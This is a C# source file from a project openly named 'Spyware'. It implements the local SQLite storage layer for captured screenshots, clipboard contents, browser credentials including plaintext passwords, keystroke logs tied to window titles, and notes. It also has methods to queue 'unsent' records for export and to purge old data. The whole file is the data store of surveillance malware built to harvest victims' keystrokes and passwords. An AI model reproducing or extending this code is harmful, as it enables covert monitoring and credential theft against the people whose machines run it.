using Microsoft.Data.Sqlite;
using Spyware.Core.Contracts;
using Spyware.Core.Logging;

namespace Spyware.Storage;

/// <summary>
/// SQLite local SIN cifrar (no se usa SQLCipher). La columna sent=1 significa
/// "duplicado al archivo local de exportación", no "enviado por red".
/// </summary>
public sealed class LocalEventRepository : IDisposable
{
    private const string Schema = """
        CREATE TABLE IF NOT EXISTS screenshots (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp_utc TEXT NOT NULL,
            path TEXT NOT NULL,
            width INTEGER,
            height INTEGER,
            hash TEXT,
            bytes INTEGER,
            display_count INTEGER,
            desktop_locked INTEGER,
            sent INTEGER DEFAULT 0
        );
        CREATE INDEX IF NOT EXISTS ix_screenshots_sent ON screenshots(sent);
        CREATE INDEX IF NOT EXISTS ix_screenshots_ts ON screenshots(timestamp_utc);

        CREATE TABLE IF NOT EXISTS clipboard_events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp_utc TEXT NOT NULL,
            format TEXT NOT NULL,
            content TEXT,
            file_path TEXT,
            length INTEGER,
            hash TEXT,
            sent INTEGER DEFAULT 0
        );
        CREATE INDEX IF NOT EXISTS ix_clipboard_sent ON clipboard_events(sent);

        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp_utc TEXT NOT NULL,
            browser TEXT,
            profile TEXT,
            url TEXT,
            username TEXT,
            password TEXT,
            encrypted_blob TEXT,
            status TEXT,
            created_at TEXT,
            last_used_at TEXT,
            times_used INTEGER,
            failure_reason TEXT,
            sent INTEGER DEFAULT 0
        );
        CREATE INDEX IF NOT EXISTS ix_credentials_sent ON credentials(sent);

        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp_utc TEXT NOT NULL,
            started_utc TEXT,
            window_title TEXT,
            process_name TEXT,
            text TEXT,
            key_count INTEGER,
            char_count INTEGER,
            truncated INTEGER,
            hash TEXT,
            file_path TEXT,
            sent INTEGER DEFAULT 0
        );
        CREATE INDEX IF NOT EXISTS ix_keystrokes_sent ON keystrokes(sent);
        CREATE INDEX IF NOT EXISTS ix_keystrokes_ts ON keystrokes(timestamp_utc);

        CREATE TABLE IF NOT EXISTS notes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp_utc TEXT NOT NULL,
            source TEXT NOT NULL,
            store TEXT,
            note_id TEXT,
            text TEXT,
            format TEXT,
            status TEXT,
            failure_reason TEXT,
            length INTEGER,
            hash TEXT,
            deleted INTEGER,
            created_at TEXT,
            updated_at TEXT,
            sent INTEGER DEFAULT 0
        );
        CREATE INDEX IF NOT EXISTS ix_notes_sent ON notes(sent);
        CREATE INDEX IF NOT EXISTS ix_notes_ts ON notes(timestamp_utc);

        CREATE TABLE IF NOT EXISTS meta (key TEXT PRIMARY KEY, value TEXT);
        """;

    private static readonly string[] EventTables =
        { "screenshots", "clipboard_events", "credentials", "keystrokes", "notes" };

    private readonly string _dbPath;
    private readonly ILog _log;
    private bool _initialized;

    public LocalEventRepository(string dbPath, ILog log)
    {
        _dbPath = dbPath;
        _log = log;
        Directory.CreateDirectory(Path.GetDirectoryName(dbPath)!);
    }

    public void Initialize()
    {
        if (_initialized) return;

        using SqliteConnection connection = Open();
        Execute(connection, "PRAGMA journal_mode = WAL;");
        Execute(connection, "PRAGMA busy_timeout = 5000;");
        Execute(connection, Schema);

        _initialized = true;
        _log.Info("Base de datos local lista (sin cifrar): " + _dbPath);
    }

    // ---------- escrituras ----------

    public long InsertScreenshot(ScreenshotEvent evt)
    {
        Initialize();

        const string sql = """
            INSERT INTO screenshots
                (timestamp_utc, path, width, height, hash, bytes, display_count, desktop_locked, sent)
            VALUES ($ts, $path, $width, $height, $hash, $bytes, $displays, $locked, 0);
            SELECT last_insert_rowid();
            """;

        using SqliteConnection connection = Open();
        using SqliteCommand command = connection.CreateCommand();
        command.CommandText = sql;
        command.Parameters.AddWithValue("$ts", TimeText.Format(evt.TimestampUtc));
        command.Parameters.AddWithValue("$path", evt.Path);
        command.Parameters.AddWithValue("$width", evt.Width);
        command.Parameters.AddWithValue("$height", evt.Height);
        command.Parameters.AddWithValue("$hash", (object?)evt.Hash ?? DBNull.Value);
        command.Parameters.AddWithValue("$bytes", evt.Bytes);
        command.Parameters.AddWithValue("$displays", evt.DisplayCount);
        command.Parameters.AddWithValue("$locked", evt.DesktopLocked ? 1 : 0);

        return Convert.ToInt64(command.ExecuteScalar());
    }

    public long InsertClipboard(ClipboardEvent evt)
    {
        Initialize();

        const string sql = """
            INSERT INTO clipboard_events
                (timestamp_utc, format, content, file_path, length, hash, sent)
            VALUES ($ts, $format, $content, $file, $length, $hash, 0);
            SELECT last_insert_rowid();
            """;

        using SqliteConnection connection = Open();
        using SqliteCommand command = connection.CreateCommand();
        command.CommandText = sql;
        command.Parameters.AddWithValue("$ts", TimeText.Format(evt.TimestampUtc));
        command.Parameters.AddWithValue("$format", evt.Format);
        command.Parameters.AddWithValue("$content", (object?)evt.Content ?? DBNull.Value);
        command.Parameters.AddWithValue("$file", (object?)evt.FilePath ?? DBNull.Value);
        command.Parameters.AddWithValue("$length", evt.Length);
        command.Parameters.AddWithValue("$hash", (object?)evt.Hash ?? DBNull.Value);

        return Convert.ToInt64(command.ExecuteScalar());
    }

    public int InsertCredentials(IReadOnlyList<CredentialEvent> events)
    {
        if (events.Count == 0) return 0;

        Initialize();

        const string sql = """
            INSERT INTO credentials
                (timestamp_utc, browser, profile, url, username, password,
                 encrypted_blob, status, created_at, last_used_at, times_used, failure_reason, sent)
            VALUES
                ($ts, $browser, $profile, $url, $username, $password,
                 $blob, $status, $created, $used, $times, $reason, 0);
            """;

        int inserted = 0;
        using SqliteConnection connection = Open();
        using SqliteCommand command = connection.CreateCommand();
        command.CommandText = sql;

        for (int i = 0; i < events.Count; i++)
        {
            CredentialEvent evt = events[i];
            command.Parameters.Clear();
            command.Parameters.AddWithValue("$ts", TimeText.Format(evt.TimestampUtc));
            command.Parameters.AddWithValue("$browser", evt.Browser);
            command.Parameters.AddWithValue("$profile", evt.Profile);
            command.Parameters.AddWithValue("$url", evt.Url);
            command.Parameters.AddWithValue("$username", evt.Username);
            command.Parameters.AddWithValue("$password", (object?)evt.Password ?? DBNull.Value);
            command.Parameters.AddWithValue("$blob", (object?)evt.EncryptedBlobBase64 ?? DBNull.Value);
            command.Parameters.AddWithValue("$status", evt.Status);
            command.Parameters.AddWithValue("$created", evt.CreatedAt.HasValue ? TimeText.Format(evt.CreatedAt.Value) : (object)DBNull.Value);
            command.Parameters.AddWithValue("$used", evt.LastUsedAt.HasValue ? TimeText.Format(evt.LastUsedAt.Value) : (object)DBNull.Value);
            command.Parameters.AddWithValue("$times", evt.TimesUsed);
            command.Parameters.AddWithValue("$reason", (object?)evt.FailureReason ?? DBNull.Value);
            inserted += command.ExecuteNonQuery();
        }

        return inserted;
    }

    public long InsertKeyEvent(KeyEvent evt)
    {
        Initialize();

        const string sql = """
            INSERT INTO keystrokes
                (timestamp_utc, started_utc, window_title, process_name, text,
                 key_count, char_count, truncated, hash, file_path, sent)
            VALUES
                ($ts, $started, $title, $process, $text,
                 $keys, $chars, $truncated, $hash, $file, 0);
            SELECT last_insert_rowid();
            """;

        using SqliteConnection connection = Open();
        using SqliteCommand command = connection.CreateCommand();
        command.CommandText = sql;
        command.Parameters.AddWithValue("$ts", TimeText.Format(evt.TimestampUtc));
        command.Parameters.AddWithValue("$started", TimeText.Format(evt.StartedUtc));
        command.Parameters.AddWithValue("$title", evt.WindowTitle);
        command.Parameters.AddWithValue("$process", evt.ProcessName);
        command.Parameters.AddWithValue("$text", evt.Text);
        command.Parameters.AddWithValue("$keys", evt.KeyCount);
        command.Parameters.AddWithValue("$chars", evt.CharCount);
        command.Parameters.AddWithValue("$truncated", evt.Truncated ? 1 : 0);
        command.Parameters.AddWithValue("$hash", (object?)evt.Hash ?? DBNull.Value);
        command.Parameters.AddWithValue("$file", (object?)evt.FilePath ?? DBNull.Value);

        return Convert.ToInt64(command.ExecuteScalar());
    }

    public int InsertNotes(IReadOnlyList<NoteEvent> events)
    {
        if (events.Count == 0) return 0;

        Initialize();

        const string sql = """
            INSERT INTO notes
                (timestamp_utc, source, store, note_id, text, format, status,
                 failure_reason, length, hash, deleted, created_at, updated_at, sent)
            VALUES
                ($ts, $source, $store, $note, $text, $format, $status,
                 $reason, $length, $hash, $deleted, $created, $updated, 0);
            """;

        int inserted = 0;
        using SqliteConnection connection = Open();
        using SqliteCommand command = connection.CreateCommand();
        command.CommandText = sql;

        for (int i = 0; i < events.Count; i++)
        {
            NoteEvent evt = events[i];
            command.Parameters.Clear();
            command.Parameters.AddWithValue("$ts", TimeText.Format(evt.TimestampUtc));
            command.Parameters.AddWithValue("$source", evt.Source);
            command.Parameters.AddWithValue("$store", evt.Store);
            command.Parameters.AddWithValue("$note", evt.NoteId);
            command.Parameters.AddWithValue("$text", (object?)evt.Text ?? DBNull.Value);
            command.Parameters.AddWithValue("$format", evt.Format);
            command.Parameters.AddWithValue("$status", evt.Status);
            command.Parameters.AddWithValue("$reason", (object?)evt.FailureReason ?? DBNull.Value);
            command.Parameters.AddWithValue("$length", evt.Length);
            command.Parameters.AddWithValue("$hash", (object?)evt.Hash ?? DBNull.Value);
            command.Parameters.AddWithValue("$deleted", evt.Deleted ? 1 : 0);
            command.Parameters.AddWithValue("$created", evt.CreatedAt.HasValue ? TimeText.Format(evt.CreatedAt.Value) : (object)DBNull.Value);
            command.Parameters.AddWithValue("$updated", evt.UpdatedAt.HasValue ? TimeText.Format(evt.UpdatedAt.Value) : (object)DBNull.Value);
            inserted += command.ExecuteNonQuery();
        }

        return inserted;
    }

    // ---------- lecturas ----------
    public IReadOnlyList<ScreenshotRow> GetUnsentScreenshots(int limit)
    {
        Initialize();

        var rows = new List<ScreenshotRow>();
        using SqliteConnection connection = Open();
        using SqliteCommand command = connection.CreateCommand();
        command.CommandText = """
            SELECT id, timestamp_utc, path, width, height, hash, bytes, display_count, desktop_locked
            FROM screenshots WHERE sent = 0 ORDER BY id ASC LIMIT $limit;
            """;
        command.Parameters.AddWithValue("$limit", Math.Max(1, limit));

        using SqliteDataReader reader = command.ExecuteReader();
        while (reader.Read())
        {
            rows.Add(new ScreenshotRow(
                reader.GetInt64(0), TimeText.Parse(reader.GetString(1)), reader.GetString(2),
                GetInt(reader, 3), GetInt(reader, 4), GetString(reader, 5),
                GetLong(reader, 6), GetInt(reader, 7), GetInt(reader, 8) != 0));
        }

        return rows;
    }

    public IReadOnlyList<ClipboardRow> GetUnsentClipboard(int limit)
    {
        Initialize();

        var rows = new List<ClipboardRow>();
        using SqliteConnection connection = Open();
        using SqliteCommand command = connection.CreateCommand();
        command.CommandText = """
            SELECT id, timestamp_utc, format, content, file_path, length, hash
            FROM clipboard_events WHERE sent = 0 ORDER BY id ASC LIMIT $limit;
            """;
        command.Parameters.AddWithValue("$limit", Math.Max(1, limit));

        using SqliteDataReader reader = command.ExecuteReader();
        while (reader.Read())
        {
            rows.Add(new ClipboardRow(
                reader.GetInt64(0), TimeText.Parse(reader.GetString(1)), reader.GetString(2),
                GetString(reader, 3), GetString(reader, 4), GetLong(reader, 5), GetString(reader, 6)));
        }

        return rows;
    }

    public IReadOnlyList<CredentialRow> GetUnsentCredentials(int limit)
    {
        Initialize();

        var rows = new List<CredentialRow>();
        using SqliteConnection connection = Open();
        using SqliteCommand command = connection.CreateCommand();
        command.CommandText = """
            SELECT id, timestamp_utc, browser, profile, url, username, password,
                   encrypted_blob, status, created_at, last_used_at
            FROM credentials WHERE sent = 0 ORDER BY id ASC LIMIT $limit;
            """;
        command.Parameters.AddWithValue("$limit", Math.Max(1, limit));

        using SqliteDataReader reader = command.ExecuteReader();
        while (reader.Read())
        {
            string? created = GetString(reader, 9);
            string? used = GetString(reader, 10);

            rows.Add(new CredentialRow(
                reader.GetInt64(0), TimeText.Parse(reader.GetString(1)), GetString(reader, 2) ?? "",
                GetString(reader, 3) ?? "", GetString(reader, 4) ?? "", GetString(reader, 5) ?? "",
                GetString(reader, 6), GetString(reader, 7), GetString(reader, 8) ?? "",
                created is null ? null : TimeText.Parse(created),
                used is null ? null : TimeText.Parse(used)));
        }

        return rows;
    }

    public IReadOnlyList<KeystrokeRow> GetUnsentKeystrokes(int limit)
    {
        Initialize();

        var rows = new List<KeystrokeRow>();
        using SqliteConnection connection = Open();
        using SqliteCommand command = connection.CreateCommand();
        command.CommandText = """
            SELECT id, timestamp_utc, started_utc, window_title, process_name, text,
                   key_count, char_count, truncated, hash, file_path
            FROM keystrokes WHERE sent = 0 ORDER BY id ASC LIMIT $limit;
            """;
        command.Parameters.AddWithValue("$limit", Math.Max(1, limit));

        using SqliteDataReader reader = command.ExecuteReader();
        while (reader.Read())
        {
            string? started = GetString(reader, 2);

            rows.Add(new KeystrokeRow(
                reader.GetInt64(0), TimeText.Parse(reader.GetString(1)),
                started is null ? null : TimeText.Parse(started),
                GetString(reader, 3) ?? string.Empty, GetString(reader, 4) ?? string.Empty,
                GetString(reader, 5) ?? string.Empty, GetInt(reader, 6), GetInt(reader, 7),
                GetInt(reader, 8) != 0, GetString(reader, 9), GetString(reader, 10)));
        }

        return rows;
    }

    public IReadOnlyList<NoteRow> GetUnsentNotes(int limit)
    {
        Initialize();

        var rows = new List<NoteRow>();
        using SqliteConnection connection = Open();
        using SqliteCommand command = connection.CreateCommand();
        command.CommandText = """
            SELECT id, timestamp_utc, source, store, note_id, text, format, status,
                   failure_reason, length, hash, deleted, created_at, updated_at
            FROM notes WHERE sent = 0 ORDER BY id ASC LIMIT $limit;
            """;
        command.Parameters.AddWithValue("$limit", Math.Max(1, limit));

        using SqliteDataReader reader = command.ExecuteReader();
        while (reader.Read())
        {
            string? created = GetString(reader, 12);
            string? updated = GetString(reader, 13);

            rows.Add(new NoteRow(
                reader.GetInt64(0), TimeText.Parse(reader.GetString(1)),
                GetString(reader, 2) ?? string.Empty, GetString(reader, 3) ?? string.Empty,
                GetString(reader, 4) ?? string.Empty, GetString(reader, 5),
                GetString(reader, 6) ?? "text", GetString(reader, 7) ?? string.Empty,
                GetString(reader, 8), GetInt(reader, 9), GetString(reader, 10),
                GetInt(reader, 11) != 0,
                created is null ? null : TimeText.Parse(created),
                updated is null ? null : TimeText.Parse(updated)));
        }

        return rows;
    }

    public int CountUnsent()
    {
        Initialize();

        int total = 0;
        using SqliteConnection connection = Open();
        foreach (string table in EventTables)
        {
            using SqliteCommand command = connection.CreateCommand();
            command.CommandText = $"SELECT COUNT(1) FROM {table} WHERE sent = 0;";
            total += Convert.ToInt32(command.ExecuteScalar());
        }

        return total;
    }

    public IReadOnlyDictionary<string, int> GetStats()
    {
        Initialize();

        var stats = new Dictionary<string, int>();
        using SqliteConnection connection = Open();

        foreach (string table in EventTables)
        {
            using SqliteCommand total = connection.CreateCommand();
            total.CommandText = $"SELECT COUNT(1) FROM {table};";
            stats[table] = Convert.ToInt32(total.ExecuteScalar());

            using SqliteCommand pending = connection.CreateCommand();
            pending.CommandText = $"SELECT COUNT(1) FROM {table} WHERE sent = 0;";
            stats[table + "_pendientes"] = Convert.ToInt32(pending.ExecuteScalar());
        }

        return stats;
    }

    /// <summary>
    /// Rutas de archivo que todavía tienen una fila viva. Sirve para el barrido de
    /// huérfanos: los volcados sin fila asociada (notes_*.json, lotes exportados) también
    /// vencen, y los que sí la tienen se borran junto con su fila.
    /// </summary>
    public IReadOnlyList<string> GetReferencedFilePaths()
    {
        Initialize();

        var paths = new List<string>();
        using SqliteConnection connection = Open();
        using SqliteCommand command = connection.CreateCommand();
        command.CommandText = """
            SELECT path FROM screenshots WHERE path IS NOT NULL
            UNION SELECT file_path FROM clipboard_events WHERE file_path IS NOT NULL
            UNION SELECT file_path FROM keystrokes WHERE file_path IS NOT NULL;
            """;

        using SqliteDataReader reader = command.ExecuteReader();
        while (reader.Read())
            paths.Add(reader.GetString(0));

        return paths;
    }

    public long GetDatabaseBytes()
    {
        long bytes = 0;
        foreach (string file in new[] { _dbPath, _dbPath + "-wal", _dbPath + "-shm" })
        {
            var info = new FileInfo(file);
            if (info.Exists) bytes += info.Length;
        }

        return bytes;
    }

    public void SetMeta(string key, string value)
    {
        Initialize();

        using SqliteConnection connection = Open();
        using SqliteCommand command = connection.CreateCommand();
        command.CommandText = "INSERT INTO meta(key, value) VALUES ($k, $v) ON CONFLICT(key) DO UPDATE SET value = excluded.value;";
        command.Parameters.AddWithValue("$k", key);
        command.Parameters.AddWithValue("$v", value);
        command.ExecuteNonQuery();
    }

    public string? GetMeta(string key)
    {
        Initialize();

        using SqliteConnection connection = Open();
        using SqliteCommand command = connection.CreateCommand();
        command.CommandText = "SELECT value FROM meta WHERE key = $k;";
        command.Parameters.AddWithValue("$k", key);

        return command.ExecuteScalar() as string;
    }

    // ---------- marcado y purga ----------

    public void MarkScreenshotsSent(IEnumerable<long> ids) => MarkSent("screenshots", ids);
    public void MarkClipboardSent(IEnumerable<long> ids) => MarkSent("clipboard_events", ids);
    public void MarkCredentialsSent(IEnumerable<long> ids) => MarkSent("credentials", ids);
    public void MarkKeysSent(IEnumerable<long> ids) => MarkSent("keystrokes", ids);
    public void MarkNotesSent(IEnumerable<long> ids) => MarkSent("notes", ids);

    private void MarkSent(string table, IEnumerable<long> ids)
    {
        List<long> list = ids.Distinct().ToList();
        if (list.Count == 0) return;

        using SqliteConnection connection = Open();
        using SqliteCommand command = connection.CreateCommand();
        string[] names = list.Select((_, index) => "@p" + index).ToArray();
        command.CommandText = $"UPDATE {table} SET sent = 1 WHERE id IN ({string.Join(",", names)});";

        for (int i = 0; i < list.Count; i++)
            command.Parameters.AddWithValue(names[i], list[i]);

        command.ExecuteNonQuery();
    }

    /// <summary>Elimina filas antiguas y devuelve las rutas de archivo asociadas.</summary>
    public IReadOnlyList<string> DeleteOlderThan(DateTime cutoffUtc)
    {
        Initialize();

        var paths = new List<string>();
        string cutoff = TimeText.Format(cutoffUtc);

        using SqliteConnection connection = Open();

        // Tabla -> columna con ruta de archivo (null: la tabla no guarda archivos).
        var tables = new (string Table, string? PathColumn)[]
        {
            ("screenshots", "path"),
            ("clipboard_events", "file_path"),
            ("keystrokes", "file_path"),
            ("credentials", null),
            ("notes", null)
        };

        foreach ((string table, string? pathColumn) in tables)
        {
            if (pathColumn is not null)
            {
                using (SqliteCommand select = connection.CreateCommand())
                {
                    select.CommandText =
                        $"SELECT {pathColumn} FROM {table} WHERE timestamp_utc < $cutoff AND {pathColumn} IS NOT NULL;";
                    select.Parameters.AddWithValue("$cutoff", cutoff);

                    using SqliteDataReader reader = select.ExecuteReader();
                    while (reader.Read())
                        if (!reader.IsDBNull(0)) paths.Add(reader.GetString(0));
                }
            }

            using SqliteCommand delete = connection.CreateCommand();
            delete.CommandText = $"DELETE FROM {table} WHERE timestamp_utc < $cutoff;";
            delete.Parameters.AddWithValue("$cutoff", cutoff);
            delete.ExecuteNonQuery();
        }

        return paths;
    }

    public int DeleteByPaths(IReadOnlyList<string> paths)
    {
        if (paths.Count == 0) return 0;

        Initialize();

        int deleted = 0;
        using SqliteConnection connection = Open();

        foreach (string path in paths)
        {
            using SqliteCommand command = connection.CreateCommand();
            command.CommandText = """
                DELETE FROM screenshots WHERE path = $p;
                DELETE FROM clipboard_events WHERE file_path = $p;
                DELETE FROM keystrokes WHERE file_path = $p;
                """;
            command.Parameters.AddWithValue("$p", path);
            deleted += command.ExecuteNonQuery();
        }

        return deleted;
    }

    // ---------- helpers ----------

    private SqliteConnection Open()
    {
        var connection = new SqliteConnection($"Data Source={_dbPath};Pooling=False;");
        connection.Open();

        using SqliteCommand command = connection.CreateCommand();
        command.CommandText = "PRAGMA busy_timeout = 5000;";
        command.ExecuteNonQuery();

        return connection;
    }

    private static void Execute(SqliteConnection connection, string sql)
    {
        using SqliteCommand command = connection.CreateCommand();
        command.CommandText = sql;
        command.ExecuteNonQuery();
    }

    private static string? GetString(SqliteDataReader reader, int ordinal) =>
        reader.IsDBNull(ordinal) ? null : reader.GetValue(ordinal)?.ToString();

    private static int GetInt(SqliteDataReader reader, int ordinal) =>
        reader.IsDBNull(ordinal) ? 0 : Convert.ToInt32(reader.GetValue(ordinal));

    private static long GetLong(SqliteDataReader reader, int ordinal) =>
        reader.IsDBNull(ordinal) ? 0 : Convert.ToInt64(reader.GetValue(ordinal));

    public void Dispose()
    {
        try { SqliteConnection.ClearAllPools(); } catch { }
    }
}
